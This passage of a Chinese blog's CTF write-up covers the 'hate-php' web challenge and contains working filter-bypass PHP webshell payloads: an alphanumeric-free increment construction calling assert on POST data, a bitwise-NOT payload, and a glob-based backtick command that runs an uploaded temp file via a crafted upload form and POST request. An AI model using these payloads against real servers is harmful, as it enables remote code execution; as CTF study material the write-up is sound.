class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// E </span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// R</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// P</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// O</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_=[];$_=@&quot;$_&quot;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);</span><br></pre></td></tr></table></figure>
+
+<p>对上述的payload进行URL编码，即可成功执行；</p>
+<p><img src="/web-hate-php/image-20230223154049182.png" alt="image-20230223154049182"></p>
+<p>自此完成了无字母数字的webshell的构建；</p>
+<h3 id="无特殊字符webshell"><a href="#无特殊字符webshell" class="headerlink" title="无特殊字符webshell"></a>无特殊字符webshell</h3><p>在过滤掉字母数字的基础上，继续过滤掉了<code>_$@</code>等特殊字符，同时对长度有限制；</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">35</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;fighting!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_$@]+/&quot;</span>,<span class="variable">$code</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;fighting!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在PHP7中新增方法可以执行动态函数，例如可以通过<code>(&#39;phpinfo&#39;)();</code>的方式来执行函数，第一个括号中的可以是任意的PHP表达式；</p>
+<p>通过取反的方式构造一个执行<code>phpinfo</code>的payload；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th></th>
+<th>p</th>
+<th>h</th>
+<th>i</th>
+<th>n</th>
+<th>f</th>
+<th>o</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>二进制</td>
+<td>01110000</td>
+<td>01101000</td>
+<td>01101001</td>
+<td>01101110</td>
+<td>01100110</td>
+<td>01101111</td>
+</tr>
+<tr>
+<td>取反</td>
+<td>10001111</td>
+<td>10010111</td>
+<td>10010110</td>
+<td>10010001</td>
+<td>10011001</td>
+<td>10010000</td>
+</tr>
+<tr>
+<td>十六进制</td>
+<td>0x8F</td>
+<td>0x97</td>
+<td>0x96</td>
+<td>0x91</td>
+<td>0x99</td>
+<td>0x90</td>
+</tr>
+<tr>
+<td>URL编码</td>
+<td>%8F</td>
+<td>%97</td>
+<td>%96</td>
+<td>%91</td>
+<td>%99</td>
+<td>%90</td>
+</tr>
+</tbody></table>
+<p><img src="/web-hate-php/image-20230223161941485.png" alt="image-20230223161941485"></p>
+<p>由于PHP5中不支持此类方法，该方式在PHP5中不适用。</p>
+<p>下面介绍PHP5中的解决方法。</p>
+<p>在PHP中可以利用<code>反引号</code>来执行shell，与操作系统进行交互，而<code>反引号</code>不属于字母数字的范围，因此可以进行利用；</p>
+<ul>
+<li>shell下可以利用<code>.</code>来执行任意脚本</li>
+<li>Linux文件名支持使用glob通配符来进行代替</li>
+</ul>
+<p>Linux系统中，<code>.</code>的作用和<code>source</code>是一样的，使用当前的shell执行一个文件中的命令；如当前运行的shell是bash，<code>. file</code>就是使用bash执行<code>file</code>文件中的命令；使用<code>. file</code>执行文件，不需要文件<code>file</code>具有可执行<code>x</code>权限；因此可以在服务器中构造一个可控的文件，使用<code>.</code>来执行该文件，即可获得shell。</p>
+<p>向PHP发送一个上传文件的POST包，此时PHP会将上传的文件保存在临时文件夹下，默认保存的文件名为<code>/tmp/phpXXXXXX</code>，后面6位字符都是随机的大小写字母，此时可以使用Linux下的glob通配符来进行表示；</p>
+<ul>
+<li><code>*</code>代表0个及以上任意字符</li>
+<li><code>?</code>代表1个任意字符</li>
+</ul>
+<p>利用通配符，<code>/tmp/phpXXXXXX</code>可以表示成<code>/*/?????????</code>或者<code>/???/?????????</code>；利用通配符查看文件，发现匹配出多个文件，无法精准定位到待执行文件；</p>
+<p>PS：由于文件会自动清除，此处手动构造了上传文件用于展示；</p>
+<p><img src="/web-hate-php/image-20230224104417525.png" alt="image-20230224104417525"></p>
+<p>glob支持用<code>[^x]</code>的方法来排除该位置为<code>x</code>的字符，可以利用该方式来排除包含<code>-</code>以及<code>.</code>的文件；</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> /???/???[^-]?????</span><br></pre></td></tr></table></figure>
+
+<p><img src="/web-hate-php/image-20230224104944540.png" alt="image-20230224104944540"></p>
+<p>但是依旧无法精准定位到待执行文件；观察展示的文件，发现只有待执行的文件包含有大写字母；</p>
+<p>glob与正则表达式类似，支持使用<code>[A-Z]</code>来表示一个范围；由ASCII码表可知，大写字母在<code>?-[</code>之间，因此可以使用<code>[?-[]</code>来表示所有的大写字母；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /???/????????[?-[]</span><br></pre></td></tr></table></figure>
+
+<p><img src="/web-hate-php/image-20230224105724932.png" alt="image-20230224105724932"></p>
+<p>构造一个如下的上传页面，进行POST文件上传；</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">title</span>&gt;</span>文件上传<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.136.128:9090/index.php?code=?&gt;&lt;?=`.+/%3f%3f%3f/%3f%3f%3f%3f%3f%3f%3f%3f%5B%3f-%5B%5D`;?&gt;&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">p</span>&gt;</span>文件:</span><br><span class="line">                                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>截获如下数据包，进行上传，由于每次随机生成的PHP文件名最后一位不一定是大写字母，因此需要多次尝试；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?code=?&gt;&lt;?=`.+/%3f%3f%3f/%3f%3f%3f%3f%3f%3f%3f%3f[%3f-[]`;?&gt; HTTP/1.1</span><br><span class="line">Host: 192.168.136.128:9090</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------212777633523460541891388609784</span><br><span class="line">Content-Length: 230</span><br><span class="line">Origin: null</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------212777633523460541891388609784</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.txt&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">#!/bin/sh</span><br><span class="line">id</span><br><span class="line">-----------------------------212777633523460541891388609784--</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/web-hate-php/image-20230224110206019.png" alt="image-20230224110206019"></p>
+<p>更改上传文件内容，即可执行不同的命令；</p>
+<p>将上面的URL地址替换成靶场地址，更改文件命令，即可获取到flag；</p>
+<p><img src="/web-hate-php/image-20230224111535061.png" alt="image-20230224111535061"></p>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</span><br><span class="line">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=2#reply-list</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">小师弟</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/posts/7ed34c14.html">http://example.com/posts/7ed34c14.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">慕星aaaaa</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a><a class="post-meta__tags" href="/tags/webshell/">webshell</a><a class="post-meta__tags" href="/tags/%E5%B0%8F%E6%8A%80%E5%B7%A7/">小技巧</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/dfff04dd.html" title="【VulnHub靶场】DOUBLETROUBLE-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">【VulnHub靶场】DOUBLETROUBLE-1</div></div></a></div><div class="next-post pull-right"><a href="/posts/1460621.html" title="【漏洞复现】禅道系统权限绕过及SQL注入"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">【漏洞复现】禅道系统权限绕过及SQL注入</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">小师弟</div><div class="author-info__description">向阳生长</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97webshell"><span class="toc-number">1.</span> <span class="toc-text">无字母数字webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F%E4%B8%80%EF%BC%9A%E5%BC%82%E6%88%96"><span class="toc-number">1.1.</span> <span class="toc-text">方式一：异或</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F%E4%BA%8C%EF%BC%9A%E5%8F%96%E5%8F%8D"><span class="toc-number">1.2.</span> <span class="toc-text">方式二：取反</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F%E4%B8%89%EF%BC%9A%E8%87%AA%E5%A2%9E"><span class="toc-number">1.3.</span> <span class="toc-text">方式三：自增</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6webshell"><span class="toc-number">2.</span> <span class="toc-text">无特殊字符webshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">3.</span> <span class="toc-text">参考链接</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/5b702f7a.html" title="2021-第五空间智能安全大赛-Web-EasyCleanup 分析">2021-第五空间智能安全大赛-Web-EasyCleanup 分析</a><time datetime="2023-03-30T12:09:03.000Z" title="发表于 2023-03-30 12:09:03">2023-03-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/c27044da.html" title="【漏洞复现】F5 BIG-IP 远程代码执行漏洞 CVE-2020-5902">【漏洞复现】F5 BIG-IP 远程代码执行漏洞 CVE-2020-5902</a><time datetime="2023-03-30T12:06:40.000Z" title="发表于 2023-03-30 12:06:40">2023-03-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/dfff04dd.html" title="【VulnHub靶场】DOUBLETROUBLE-1">【VulnHub靶场】DOUBLETROUBLE-1</a><time datetime="2023-03-30T12:04:45.000Z" title="发表于 2023-03-30 12:04:45">2023-03-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/7ed34c14.html" title="2021-第五届世界智能大会-「津门杯」国际网络安全创新大赛-Web-hate-php">2021-第五届世界智能大会-「津门杯」国际网络安全创新大赛-Web-hate-php</a><time datetime="2023-03-30T12:01:02.000Z" title="发表于 2023-03-30 12:01:02">2023-03-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/1460621.html" title="【漏洞复现】禅道系统权限绕过及SQL注入">【漏洞复现】禅道系统权限绕过及SQL注入</a><time datetime="2023-03-30T11:57:56.000Z" title="发表于 2023-03-30 11:57:56">2023-03-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By 小师弟</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="8152976493" data-server="netease" data-type="playlist"   data-order="list" data-fixed="true" data-preload="auto" data-autoplay="false" data-mutex="true" ></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="app-refresh" id="app-refresh" style="position: fixed;top: -2.2rem;left: 0;right: 0;z-index: 99999;padding: 0 1rem;font-size: 15px;height: 2.2rem;transition: all 0.3s ease;"><div class="app-refresh-wrap" style=" display: flex;color: #fff;height: 100%;align-items: center;justify-content: center;"><label>✨ 有新文章啦！ 👉</label><a href="javascript:void(0)" onclick="location.reload()"><span style="color: #fff;text-decoration: underline;cursor: pointer;">🍗点击食用🍔</span></a></div></div><script>if ('serviceWorker' in navigator) {
+if (navigator.serviceWorker.controller) {
+navigator.serviceWorker.addEventListener('controllerchange', function() {
+showNotification()
+})
+}
+window.addEventListener('load', function() {
+navigator.serviceWorker.register('/sw.js')
+})
+}
+function showNotification() {
+if (GLOBAL_CONFIG.Snackbar) {
+var snackbarBg =
+document.documentElement.getAttribute('data-theme') === 'light' ?
+GLOBAL_CONFIG.Snackbar.bgLight :
+GLOBAL_CONFIG.Snackbar.bgDark
+var snackbarPos = GLOBAL_CONFIG.Snackbar.position
+Snackbar.show({
+text: '✨ 有新文章啦！ 👉',
+backgroundColor: snackbarBg,
+duration: 500000,
+pos: snackbarPos,
+actionText: '🍗点击食用🍔',
+actionTextColor: '#fff',
+onActionClick: function(e) {
+location.reload()
+},
+})
+} else {
+var showBg =
+document.documentElement.getAttribute('data-theme') === 'light' ?
+'#3b70fc' :
+'#1f1f1f'
+var cssText = `top: 0; background: ${showBg};`
+document.getElementById('app-refresh').style.cssText = cssText
+}
+}</script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div><!-- hexo injector body_end start --><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '1.5s');
+    arr[i].setAttribute('data-wow-delay', '200ms');
+    arr[i].setAttribute('data-wow-offset', '30');
+    arr[i].setAttribute('data-wow-iteration', '1');
+  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '');
+    arr[i].setAttribute('data-wow-delay', '200ms');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('flink-list-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__flipInY');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('flink-list-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__animated');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('article-sort-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__slideInRight');
+    arr[i].setAttribute('data-wow-duration', '1.5s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('site-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__flipInY');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
